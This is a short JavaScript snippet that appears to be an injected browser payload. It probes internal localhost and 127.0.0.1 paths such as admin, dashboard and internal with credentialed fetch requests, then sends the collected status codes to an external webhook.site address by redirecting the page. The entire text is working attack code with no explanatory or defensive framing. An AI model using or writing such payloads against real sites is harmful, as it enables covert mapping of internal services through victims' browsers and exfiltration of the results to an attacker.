(async()=>{
let paths=[
'http://127.0.0.1/',
'http://127.0.0.1/dashboard',
'http://127.0.0.1/security',
'http://127.0.0.1/admin',
'http://127.0.0.1/internal',
'http://localhost/',
'http://localhost/dashboard',
'http://localhost/security',
'http://localhost/admin',
'http://localhost/internal'
];
let out=[];
for(let p of paths){
  try{
    let r=await fetch(p,{credentials:'include'});
    out.push(p+":"+r.status);
  }catch(e){
    out.push(p+":ERR");
  }
}
location="https://webhook.site/ID/?d="+encodeURIComponent(out.join("|"));
})();